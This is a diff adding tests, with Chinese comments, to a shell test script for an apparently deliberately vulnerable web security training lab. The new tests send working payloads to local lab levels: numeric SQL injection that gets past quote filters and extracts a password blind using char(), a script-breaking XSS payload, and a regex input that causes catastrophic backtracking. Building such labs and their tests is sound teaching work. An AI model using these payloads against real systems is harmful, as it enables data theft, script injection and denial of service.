@@ -2127,6 +2127,104 @@ curl -s -o /dev/null -X POST "$BASE/v/sqli/sleepless_time_blind/" \
   --data-urlencode "guess=q7m4xd"
 expect_solved "sqli/sleepless_time_blind" "check() 确认两个目标都达成"
 
+step "19. SQLi 系列：过滤掉引号 / XSS 的 JS 上下文 / ReDoS"
+
+# ---- sqli/quote_filter：引号、注释、union 都被拦了
+expect_unsolved "sqli/quote_filter" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/sqli/quote_filter/query" --data-urlencode "sku_id=1001")
+expect_has "正常查库存" "KB-MECH-01" "$body"
+expect_unsolved "sqli/quote_filter" "正常查询不算"
+
+body=$(page -X POST "$BASE/v/sqli/quote_filter/query" \
+  --data-urlencode "sku_id=1001' OR '1'='1")
+expect_has "引号被过滤器拦下" "单引号" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/quote_filter/query" \
+  --data-urlencode "sku_id=1 UNION SELECT 1,2,3")
+expect_has "union 被过滤器拦下" "union" "$body"
+
+# 关键：注入点是**数字型**的，所以引号被拦根本不影响
+body=$(page -X POST "$BASE/v/sqli/quote_filter/query" \
+  --data-urlencode "sku_id=9999 OR 1=1")
+expect_has "数字型 payload 一个引号都不用" "KB-MECH-01" "$body"
+expect_has "而且拼出的语句里能看到它" "OR 1=1" "$body"
+
+# 不用引号拼字符串：char()
+body=$(page -X POST "$BASE/v/sqli/quote_filter/query" \
+  --data-urlencode "sku_id=9999 OR (SELECT substr(password,1,1) FROM users WHERE username=char(97,100,109,105,110))=char(116)")
+expect_has "char() 拼出的字符串能参与比较（猜对 → 有结果）" "KB-MECH-01" "$body"
+
+body=$(page -X POST "$BASE/v/sqli/quote_filter/query" \
+  --data-urlencode "sku_id=9999 OR (SELECT substr(password,1,1) FROM users WHERE username=char(97,100,109,105,110))=char(122)")
+expect_no "猜错 → 没有结果（真假可区分）" "KB-MECH-01" "$body"
+expect_unsolved "sqli/quote_filter" "信道通了但密码还没提交"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/quote_filter/submit" \
+  --data-urlencode "guess=wrong1"
+expect_unsolved "sqli/quote_filter" "猜错密码不算"
+
+curl -s -o /dev/null -X POST "$BASE/v/sqli/quote_filter/submit" \
+  --data-urlencode "guess=t4kp8w"
+expect_solved "sqli/quote_filter" "check() 确认两个目标都达成"
+
+# ---- xss/js_context：注入点在 JS 字符串里
+expect_unsolved "xss/js_context" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/xss/js_context/" --data-urlencode "q=hello")
+expect_has "正常搜索把关键词嵌进了 JS" "recentQuery" "$body"
+expect_unsolved "xss/js_context" "正常输入不算"
+
+body=$(page -X POST "$BASE/v/xss/js_context/" \
+  --data-urlencode "q=<script>alert(1)</script>")
+expect_has "开始标签被过滤器拦下" "script 开始标签" "$body"
+expect_unsolved "xss/js_context" "开始标签打不通"
+
+# 关键：过滤器拦的是开始标签，而打断 script 元素只需要**结束**标签
+body=$(page -X POST "$BASE/v/xss/js_context/" \
+  --data-urlencode "q=</script><img src=x onerror=alert(1)>")
+expect_no "结束标签过了过滤器（一次都没命中）" "被过滤器拦下" "$body"
+expect_solved "xss/js_context" "check() 确认嵌进去的值里出现了能打断 script 的东西"
+
+# 真实字节用 curl 看（页面里显示的是转义形式）
+raw=$(curl -s -X POST "$BASE/v/xss/js_context/" \
+  --data-urlencode "q=</script><img src=x onerror=alert(1)>")
+expect_has "响应体里确实带了原文的结束标签" "</script><img src=x onerror=alert(1)>" "$raw"
+
+# ---- dos/regex_backtracking：一小段输入让校验爆炸
+expect_unsolved "dos/regex_backtracking" "动手之前 check() 说未通关"
+
+body=$(page -X POST "$BASE/v/dos/regex_backtracking/" \
+  --data-urlencode "tags=work urgent review")
+expect_has "正常标签格式合法" "格式合法" "$body"
+t_ok=$(curl -s -o /dev/null -w '%{time_total}' -X POST \
+  "$BASE/v/dos/regex_backtracking/" --data-urlencode "tags=work urgent review")
+expect_lt "正常输入秒过" "$t_ok" "0.5"
+
+# 尾部那个 ! 是关键：匹配成功不会慢，匹配失败才要穷举所有切法
+t18=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/dos/regex_backtracking/" \
+  --data-urlencode "tags=aaaaaaaaaaaaaaaaaa!")
+t22=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/dos/regex_backtracking/" \
+  --data-urlencode "tags=aaaaaaaaaaaaaaaaaaaaaa!")
+t26=$(curl -s -o /dev/null -w '%{time_total}' -X POST "$BASE/v/dos/regex_backtracking/" \
+  --data-urlencode "tags=aaaaaaaaaaaaaaaaaaaaaaaaaa!")
+expect_lt "18 个字符还很快" "$t18" "0.5"
+expect_ge "26 个字符让校验超过 2 秒" "$t26" "2.0"
+
+# 指数增长：26 字符的耗时应当是 22 字符的 3 倍以上（实测约 16 倍）
+if awk "BEGIN{exit !($t26 > $t22 * 3)}"; then
+  ok "耗时随长度指数增长（26 字符 $t26 秒 vs 22 字符 $t22 秒）"
+else
+  bad "耗时没有指数增长（26 字符 $t26 秒 vs 22 字符 $t22 秒）"
+fi
+expect_solved "dos/regex_backtracking" "check() 确认触发了灾难性回溯"
+
+# 靶场的输入上限（不是修复，是防一个请求卡住几分钟）
+long_input=$(printf 'a%.0s' $(seq 1 40))
+body=$(page -X POST "$BASE/v/dos/regex_backtracking/" \
+  --data-urlencode "tags=$long_input")
+expect_has "超过 28 字符的输入被靶场挡下" "超过 28" "$body"
+
 step "结果"
 printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
 if [ "$FAIL" != "0" ]; then
